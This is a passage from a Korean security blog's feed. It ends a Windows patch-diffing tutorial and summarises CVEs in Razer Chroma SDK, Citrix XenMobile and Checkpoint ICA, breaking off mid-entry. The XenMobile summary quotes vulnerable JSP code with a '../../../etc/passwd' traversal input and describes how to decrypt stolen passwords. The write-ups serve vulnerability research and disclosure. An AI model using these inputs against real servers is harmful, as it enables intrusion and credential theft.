&#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC788;&#xC5B4;&#xC694;.</p><p>&lt;/br&gt;</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/4.png" alt></p><p>&#xC18D;&#xC131;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xBA74; 10.0.18362.1 &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xB864;&#xBC31;&#xC774; &#xC798; &#xB410;&#xB124;&#xC694;!</p><p>&#xC774;&#xC81C; &#xC6B0;&#xB9AC;&#xAC00; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0;&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; <code>ntoskrnl</code>&#xC758; 1016&#xBC84;&#xC804; forward diff&#xB85C; &#xD328;&#xCE58;&#xB97C; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;</p><p>&lt;/br&gt;</p><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> result_ntoskrnl.exe <span class="hljs-literal">-o</span> ntoskrnl_1016.exe ^<span class="hljs-literal">-p</span> [<span class="hljs-type">EXTRACTED</span> <span class="hljs-type">PATH</span>]\\amd64_microsoft...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1016</span>...\\f\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/5.png" alt></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/6.png" alt></p><p>&#xBC84;&#xC804;&#xC740; 1016&#xC73C;&#xB85C; &#xC798; &#xC62C;&#xB77C;&#xAC04; &#xAC83; &#xAC19;&#xAD70;&#xC694;. hash&#xB3C4; &#xBE44;&#xAD50;&#xD574;&#xBCF4;&#xC8E0;.</p><p>&lt;/br&gt;</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/7.png" alt></p><p>JUNK&#xC758; ntoskrnl manifest&#xC5D0;&#xC11C; &#xCC38;&#xACE0;&#xD55C; hash&#xB3C4; &#xC77C;&#xCE58;&#xD558;&#xB124;&#xC694;! &#xC774;&#xB85C;&#xC368; &#xD328;&#xCE58; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD328;&#xCE58; &#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Binary-Diffing"><a href="#Binary-Diffing" class="headerlink" title="Binary Diffing"></a>Binary Diffing</h1><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/8.png" alt></p><p>(&#xAE00;&#xC744; &#xC4F0;&#xACE0; &#xC788;&#xB294; &#xC9C0;&#xAE08; &#xB0B4; &#xC0C1;&#xD0DC;)</p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD328;&#xCE58;&#xAC00; &#xC774;&#xB807;&#xAC8C; &#xD798;&#xB4E4; &#xC77C;&#xC778;&#xAC00;..? &#xACA9;&#xD558;&#xAC8C; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xC548;&#xD558;&#xACE0; &#xC2F6;&#xC5B4;&#xC84C;&#xC9C0;&#xB9CC; &#xAE30;&#xC655; &#xC4F0;&#xAE30; &#xC2DC;&#xC791;&#xD55C; &#xAC70; &#xB05D;&#xC740; &#xBD10;&#xC57C; &#xD558;&#xC9C0; &#xC54A;&#xACA0;&#xC2B5;&#xB2C8;&#xAE4C; &#xC73C;&#xC544;&#xC545; &#xBE68;&#xB9AC; &#xB05D;&#xB0B4;&#xACE0; &#xC220; &#xBA39;&#xC73C;&#xB7EC; &#xAC00;&#xC57C;&#xC9C0;</p><p>&#xB9C8;&#xC9C0;&#xB9C9;! diffing tool&#xACFC; &#xBD84;&#xC11D; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Diffing&#xC740; IDA&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD558;&#xBA70; BinDiff&#xB77C;&#xB294; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.  BinDiff&#xB294; &#xBB34;&#xB8CC;&#xB85C; &#xBC30;&#xD3EC;&#xB418;&#xB294; &#xCF54;&#xB4DC; &#xBD84;&#xC11D; IDA &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC785;&#xB2C8;&#xB2E4;. &#xC720;&#xBA85;&#xD55C; &#xB9CC;&#xD07C; &#xC131;&#xB2A5; &#xD558;&#xB098;&#xB294; &#xD655;&#xC2E4;&#xD55C; &#xCE5C;&#xAD6C;&#xC8E0;?</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/9.png" alt></p><p>BinDiff&#xB294; &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xC5D0;&#xC11C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://www.zynamics.com/software.html">zynamics.com - Software</a></p><blockquote><p>IDA 7.2, BinDiff 5(BinExport 10)&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p>IDA&#xAC00; &#xC124;&#xCE58;&#xB41C; &#xACBD;&#xB85C;&#xB97C; &#xC785;&#xB825;&#xD558;&#xACE0; &#xC124;&#xCE58;&#xD558;&#xBA74; &#xB418;&#xBA70; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xCE58;&#xAC00; &#xB418;&#xC5C8;&#xB2E4;&#xBA74; IDA&#xC758; Edit &#x2192; Plugins&#xC5D0;&#xC11C; BinDiff&#xB97C; &#xBCF4;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xC120; 1016, 1082&#xB97C; &#xAC01;&#xAC01; &#xC744; &#xC5F4;&#xACE0; Edit&#x2192;Plugins&#x2192;BinExport10&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/10.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; BinExport v2 Binary Export&#xB85C; &#xAC01;&#xAC01; Export &#xD574;&#xC8FC;&#xBA74; &#xC900;&#xBE44;&#xB294; &#xB05D;!</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/11.png" alt></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/12.png" alt></p><p>&#xC774;&#xC81C; BinDiff&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xC11C; Workspace&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; Diff&#x2192;New Diff&#xC5D0;&#xC11C; Export &#xD55C; &#xB450; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&lt;/br&gt;</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/13.png" alt></p><p>Export&#xD55C; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xACE0; Diff&#xD558;&#xBA74;..!</p><p>&lt;/br&gt;</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/14.png" alt></p><p>&#xC774;&#xB807;&#xAC8C; Overview&#xB97C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Similarity&#xB294; &#xC720;&#xC0AC;&#xB3C4;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294;&#xB370;, 1&#xC5D0; &#xAC00;&#xAE4C;&#xC6B8;&#xC218;&#xB85D; &#xCC28;&#xC774;&#xAC00; &#xC5C6;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&lt;/br&gt;</p><p>&#xC544;&#xB798;&#xB85C; &#xB0B4;&#xB824;&#xBCF4;&#xBA74; Similarity&#xAC00; &#xB0AE;&#xC740; &#xD56D;&#xBAA9;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xB370;, &#xC774; &#xC911; &#xD55C; &#xD56D;&#xBAA9;&#xC744; &#xC6B0;&#xD074;&#xB9AD;&#x2192;Open Flow Graph&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/15.png" alt></p><p>&#xC774;&#xB807;&#xAC8C; &#xADF8;&#xB798;&#xD504;&#xB85C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.  &#xAC01; &#xB178;&#xB4DC; &#xC0C9;&#xBCC4; &#xC758;&#xBBF8;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD08;&#xB85D;&#xC0C9; - &#xBCC0;&#xACBD;&#xC810; &#xC5C6;&#xC74C;</p><p>&#xB178;&#xB780;&#xC0C9; - &#xBCC0;&#xACBD;&#xC810; &#xC788;&#xC74C;</p><p>&#xBE68;&#xAC04;&#xC0C9;  - &#xD328;&#xCE58;&#xC5D0; &#xC758;&#xD574; &#xC81C;&#xAC70;&#xB428;</p><p>&#xD68C;&#xC0C9; - &#xD328;&#xCE58;&#xC5D0; &#xC758;&#xD574; &#xCD94;&#xAC00;&#xB428;</p><p>&#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xBCFC;&#xAE4C;&#xC694;? &#xBCF4;&#xB824;&#xB294; &#xB178;&#xB4DC;&#xB97C; &#xC120;&#xD0DD;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&lt;/br&gt;</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/16.png" alt></p><p>&#xC774;&#xB807;&#xAC8C; &#xC5B4;&#xC148;&#xBE14;&#xB9AC; &#xCF54;&#xB4DC;&#xAE4C;&#xC9C0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xC810;&#xC744; &#xD2B8;&#xB808;&#xC774;&#xC2F1;&#xD558;&#xBA74; &#xC5B4;&#xB5A4; &#xBD80;&#xBD84;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xC790;&#xC138;&#xD788; &#xBCFC; &#xC218; &#xC788;&#xACA0;&#xC8E0;!</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;.."></a>&#xB9C8;&#xCE58;&#xBA70;..</h1><p>&#xD328;&#xCE58; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB480;&#xC73C;&#xB2C8; &#xC6D0;&#xB370;&#xC774; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xC4F8; &#xC218; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xB124;&#xC694; &#x314E;&#x314E; &#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810;.. &#xCDE8;&#xC57D;&#xC810;&#xB9CC; &#xCC3E;&#xC73C;&#xBA74; &#xB418;&#xB294;&#xB370;&#x2026;.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/17.png" alt></p><blockquote><p>&#xC544;&#xB9C8; &#xC548;&#xB420;&#xAC70;&#xC57C;..</p></blockquote><p>&#xB2E4;&#xC74C;&#xC5D4; &#xB2E4;&#xB978; &#xC8FC;&#xC81C;&#xB85C; &#xCC3E;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC870;&#xAE08;&#xB9CC; &#xB180;&#xAD6C;&#xC694; &#x314E; (<em>&#xB9DD;&#xD560; &#xCF54;&#xB85C;&#xB098; &#xC5BC;&#xB978; &#xAEBC;&#xC838;&#xC92C;&#xC73C;&#xBA74; ^^!)</em></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
    <link href="/2020/11/28/fabu1ous/2020-11-28/"/>
    <url>/2020/11/28/fabu1ous/2020-11-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer Chroma&#xB294; Razer&#xC0AC;&#xC758; &#xAC8C;&#xC774;&#xBC0D;&#xC6A9; &#xCEF4;&#xD4E8;&#xD130; &#xC8FC;&#xBCC0;&#xAE30;&#xAE30;&#xB4E4;&#xC758; RGB &#xD6A8;&#xACFC;&#xB97C; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC73C;&#xB85C; Razer synapse &#xC124;&#xCE58; &#xC2DC; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC124;&#xCE58;&#xB429;&#xB2C8;&#xB2E4;. SDK&#xAC00; &#xC874;&#xC7AC;&#xD574;&#xC11C; third party&#xAC00; Razer Chroma&#xC640; &#xC5F0;&#xB3D9;&#xB418;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC608; ) Razer &#xC81C;&#xD488;&#xACFC; RGB&#xD6A8;&#xACFC;&#xB97C; &#xB3D9;&#xAE30;&#xD654;&#xD558;&#xB294; &#xCF00;&#xC774;&#xC2A4;, &#xC74C;&#xC545;&#xC5D0; &#xB9DE;&#xCDB0; Razer &#xC81C;&#xD488;&#xC758; RGB&#xB97C; &#xBCC0;&#xD654;&#xC2DC;&#xD0A4;&#xB294; &#xC74C;&#xC545; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xC11C;&#xBE44;&#xC2A4; </p><p>Razer Chroma SDK Rest server&#xB294; Razer Chroma&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70; &#xBAA8;&#xB4E0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC640; bind &#xD574; 54236&#xBC88; &#xD3EC;&#xD2B8;&#xB85C; listen &#xD569;&#xB2C8;&#xB2E4;. <code>http://localhost:54235/razer/chromasdk</code> &#xD639;&#xC740;<code>https://chromasdk.io:54236/razer/chromasdk</code> URI&#xB85C; App info&#xB97C; &#xB2F4;&#xC740; POST request&#xB97C; &#xBC1B;&#xC73C;&#xBA74; &#xADF8; App info&#xC5D0; &#xB530;&#xB77C; <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>&#xC5D0; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBA87; &#xAC00;&#xC9C0; &#xC774;&#xC288;&#xB85C; &#xC778;&#xD574; race-condition&#xC744; &#xC774;&#xC6A9;&#xD55C; arbitrary code execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xD574;&#xCEE4;&#xB294; Razer Chroma SDK Rest server&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xCEF4;&#xD4E8;&#xD130;(&#xC774;&#xD558; victim)&#xC758; IP&#xC8FC;&#xC18C;&#xB9CC; &#xC54C;&#xBA74; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; POST request&#xB97C; &#xBCF4;&#xB0B4; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C;&#xBA85;&#xC744; &#xAC16;&#xB294; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC744; victim&#xC5D0; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&apos;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol><li>POST request&#xB97C; &#xBC1B;&#xC544; <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>&#xC5D0; &#xC0DD;&#xC131;&#xD55C; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC740; Admin&#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xC720;&#xC800;&#xB9CC; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>&#xD3F4;&#xB354;&#xB294; Admin &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC5B4;&#xB3C4; &#xC218;&#xC815;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><ol><li>POST request&#xB85C; &#xC0DD;&#xC131;&#xD560; &#xC2E4;&#xD589;&#xD30C;&#xC77C;(test.exe)&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; &#xD30C;&#xC77C;&#xC774; &#xC774;&#xBBF8; <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>&#xD3F4;&#xB354; &#xC548;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA74; Razer Chroma SDK Rest server&#xB294; &#xAE30;&#xC874; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xADF8; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC758; &#xAD8C;&#xD55C;&#xC740; &#xADF8; &#xD30C;&#xC77C;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC804;&#xAE4C;&#xC9C4; &#xC218;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C;, &#xD574;&#xCEE4;&#xB294; race-condition&#xC73C;&#xB85C; test.exe&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC218;&#xC815;&#xD574;  arbitrary code execution&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>razer</tag>
      
      <tag>chroma</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
    <link href="/2020/11/27/l0ch/2020-11-27/"/>
    <url>/2020/11/27/l0ch/2020-11-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC870;&#xC9C1; &#xAD6C;&#xC131;&#xC6D0;&#xB4E4;&#xC758; &#xBAA8;&#xBC14;&#xC77C; &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xBC0F; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; Endpoint Management &#xC194;&#xB8E8;&#xC158;&#xC778; XenMobile&#xC5D0;&#xC11C; path traversal&#xB85C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xC784;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xC218; &#xC788;&#xACE0;, &#xC554;&#xD638;&#xD654;&#xB41C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xBCF5;&#xD638;&#xD654; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>help-sb-download.jsp</code> &#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&apos;&quot;&apos;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>)){outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    }    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>&#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xBC1B;&#xB294; <code>sbFileName</code>&#xC740; <code>sbFilePath</code>&#xC758; <code>/op/sas/support/</code> &#xB4A4;&#xC5D0; &#xC5F0;&#xACB0;&#xB418;&#xACE0; File &#xD074;&#xB798;&#xC2A4; &#xC0DD;&#xC131;&#xC790;&#xC758; &#xC778;&#xC218;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. <code>sbFileName</code>&#xC5D0; <code>../../../etc/passwd</code>&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xBA74; <code>/etc/passwd</code>&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xC758; &#xBCF5;&#xD638;&#xD654;&#xB3C4; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC554;&#xD638;&#xD654;&#xB294; <code>/opt/sas/sw/lib/libsecure.so</code> &#xC640; <code>DataSecurity.jar</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA70;  <code>/opt/sas/rt/keys/security.properties</code>&#xC5D0;&#xB294; &#xC554;&#xD638;&#xD654; &#xD0A4;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xAC00; path traversal &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC640; key&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xB85C;&#xCEEC; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC554;&#xD638;&#xD654; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; import &#xD574; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>help-sb-download.jsp</code> &#xD30C;&#xC77C;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>arbitrary file download</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-6020: Checkpoint ICA Management Tool에서 발견된 취약점 2가지</title>
    <link href="/2020/11/26/idioth/2020-11-26/"/>
    <url>/2020/11/26/idioth/2020-11-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Management&#xC758; ICA(Internal Certificate Authority) Management Tool&#xC5D0;&#xC11C; Argument Injection&#xACFC; Denial of Service &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. ICA Management Tool&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBA70; <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>&#xB85C; &#xD65C;&#xC131;&#xD654;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC124;&#xC815;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74; http://<smartcenter_ip>:18265/&#xB97C; &#xD1B5;&#xD574; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>cpca_client set_mgmt_tool on -no_ssl</code>&#xC744; &#xD1B5;&#xD574; &#xD65C;&#xC131;&#xD654;&#xD560; &#xC2DC; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; Manage Certificates&#xC5D0; &#xC811;&#xC18D;&#xD588;&#xC744; &#xB54C; &#xAD00;&#xB9AC;&#xC790;&#xC778;&#xC9C0; &#xBCC4;&#xB3C4;&#xC758; &#xD655;&#xC778;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</smartcenter_ip></p><p>ICA Management Tool&#xC5D0;&#xC11C; &#xBA54;&#xC77C;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; cpca&#xB294; sendmail 